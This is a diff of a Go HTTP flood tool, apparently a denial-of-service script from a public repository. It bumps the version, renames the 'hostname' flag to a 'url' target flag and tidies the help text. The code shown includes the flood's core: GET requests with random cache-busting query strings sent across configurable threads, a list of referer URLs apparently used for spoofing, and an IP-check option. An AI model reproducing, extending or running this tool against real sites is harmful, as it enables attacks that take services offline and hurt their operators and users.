@@ -21,7 +21,7 @@ import (
 )
 
 var (
-	version = "v1.5.0"
+	version = "v1.6.1"
 
 	banner = fmt.Sprintf(`
                           __
@@ -44,7 +44,7 @@ var (
 		"https://vk.com/profile.php?auto=",
 		"https://www.usatoday.com/search/results?q=",
 	}
-	hostname        string
+	target        string
 	paramJoiner     string
 	reqCount        uint64
 	threads         int
@@ -114,13 +114,13 @@ func fetchIP() {
 }
 
 func get() {
-	if strings.ContainsRune(hostname, '?') {
+	if strings.ContainsRune(target, '?') {
 		paramJoiner = "&"
 	} else {
 		paramJoiner = "?"
 	}
 
-	req, err := http.NewRequest("GET", hostname+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
+	req, err := http.NewRequest("GET", target+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
 	if err != nil {
 		fmt.Println(err)
 	}
@@ -160,18 +160,18 @@ func main() {
 	color.Cyan.Println(banner)
 	color.Cyan.Println("\n\t\tgithub.com/zer-far\n")
 
-	flag.StringVar(&hostname, "hostname", "", "example: --hostname https://example.com")
-	flag.IntVar(&timeout, "timeout", 3000, "Timeout in milliseconds")
-	flag.IntVar(&sleep, "sleep", 1, "Sleep time in milliseconds")
-	flag.IntVar(&threads, "threads", 1, "Number of threads")
-	flag.BoolVar(&check, "check", false, "Enable IP address check")
+	flag.StringVar(&target, "url", "", "URL to target.")
+	flag.IntVar(&timeout, "timeout", 3000, "Timeout in milliseconds.")
+	flag.IntVar(&sleep, "sleep", 1, "Sleep time in milliseconds.")
+	flag.IntVar(&threads, "threads", 1, "Number of threads.")
+	flag.BoolVar(&check, "check", false, "Enable IP address check.")
 	flag.Parse()
 
 	if check {
 		fetchIP()
 	}
 
-	if !isValidURL(hostname) {
+	if !isValidURL(target) {
 		os.Exit(1)
 	}
 	if timeout == 0 {
